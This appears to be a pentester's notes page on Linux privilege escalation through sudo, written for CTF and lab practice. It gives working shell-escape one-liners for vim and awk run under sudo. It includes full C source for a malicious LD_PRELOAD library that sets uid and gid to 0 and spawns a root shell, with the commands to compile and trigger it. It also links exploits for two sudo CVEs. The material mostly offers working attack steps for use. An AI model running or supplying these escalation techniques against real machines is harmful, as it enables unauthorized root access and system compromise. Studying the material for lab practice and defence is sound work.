# Escalation via Sudo

## Sudo Shell Escaping

- `sudo -l` will show us commands delegated to our user. See example of possible output below

- With the result of the command we can then check out on [GTFOBins](https://gtfobins.github.io/) for comprehensive ways to escalate

### Vim

- [Vim on Gtfobins](https://gtfobins.github.io/gtfobins/vim/) the section of interest for us here is the following one:

- Let's try this command `sudo vim -c ':!/bin/sh'`
- It works right away

### awk

- [Awk on GTFOBins](https://gtfobins.github.io/gtfobins/awk/) the section of interest for us here is the following one:

- So let's try this `sudo awk 'BEGIN {system("/bin/sh")}'`
- It works

## Intended Functionality

### Example with Apache2

- `sudo -l` we should see this: `(root) NOPASSWD: /usr/sbin/apache2`
- *Note: There are no entry on GTFOBins about apache2 but Google can do the trick ;) We could type something like "sudo apache2 privilege escalation"*
- Then we find an [article](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/) that mentions this command to let us view system files.

### Example with wget

- See [here](https://veteransec.org/hack-the-box-sunday-walkthrough/) an example with wget on veteransec's writeup of the HTB box called sunday.

## LD_PRELOAD

- `sudo -l` we should see something like this `env_keep+=LD_PRELOAD`
- We are going to preload a user specific share library before any other share libraries
- We need to write our malicious library that will privesc for us by changing our gid and uid to 0 (root). We put this code in a file named x.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- now we need to compile our library with gcc `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
- And now we need to set it as our user's preloaded library `sudo LD_PRELOAD=/tmp/x.so apache2`
- We should be root

## CVE-2019-14287

- [CVE-2019-14287 on exploit-db](https://www.exploit-db.com/exploits/47502)
- This vulnerability allows us to change our user id, we need to have some sudo rights delegated to us this works very well with right on `/bin/bash`
- Checkout [here](../writeups/THM-SudoSecurityBypass.md) a writeup of an example of exploitation

## CVE-2019-18634

- [CVE-2019-18634 exploit by saleemrashid](https://github.com/saleemrashid/sudo-cve-2019-18634)
- This one is a buffer overflow
- If we see that we have password feedback on (we can try any sudo command to check for this), it means that the option `pwfeedback` is turned on in `/etc/sudoers` and that makes it vulnerable to buffer overflow
- We basically just need to run the provided exploit. Pour pratice on this check out [this box](https://tryhackme.com/room/sudovulnsbof) on trhyhackme
